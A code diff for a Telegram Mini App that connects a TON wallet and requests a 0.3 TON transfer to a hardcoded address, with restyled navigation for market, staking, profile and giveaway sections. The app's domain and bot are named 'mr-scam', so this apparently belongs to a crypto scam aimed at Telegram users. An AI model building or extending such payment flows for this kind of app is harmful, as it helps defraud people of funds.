@@ -10,7 +10,7 @@ window.addEventListener('load', () => {
   tg.expand();
   tg.ready();
 
-  // Аватар и имя пользователя
+  // Аватар и имя
   let username = 'Guest';
   let avatarUrl = '';
   if (tg.initDataUnsafe.user) {
@@ -25,9 +25,7 @@ window.addEventListener('load', () => {
   const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
     buttonRootId: 'connect-container',
-    actionsConfiguration: {
-      twaReturnUrl: 'https://t.me/mrscam_test_bot'
-    }
+    actionsConfiguration: { twaReturnUrl: 'https://t.me/mrscam_test_bot' }
   });
 
   let connectedWallet = null;
@@ -52,7 +50,7 @@ window.addEventListener('load', () => {
       validUntil: Math.floor(Date.now() / 1000) + 600,
       messages: [{
         address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
-        amount: '300000000' // 0.3 TON
+        amount: '300000000'
       }]
     };
 
@@ -93,13 +91,20 @@ window.addEventListener('load', () => {
     .catch(e => alert('❌ Ошибка: ' + e.message));
   };
 
-  // Переключение табов (Stickers, Gifts, +)
-  document.querySelectorAll('.tab').forEach(tab => {
-    tab.onclick = () => {
-      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-      tab.classList.add('active');
-      document.getElementById(tab.dataset.tab).classList.add('active');
+  // Навигация по разделам
+  const sections = {
+    'market-btn': 'play-section',
+    'events-btn': 'staking-section',
+    'profile-btn': 'profile-section',
+    'giveaway-btn': 'tasks-section'
+  };
+
+  Object.keys(sections).forEach(id => {
+    document.getElementById(id).onclick = () => {
+      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+      document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+      document.getElementById(sections[id]).classList.add('active');
+      document.getElementById(id).classList.add('active');
     };
   });
 
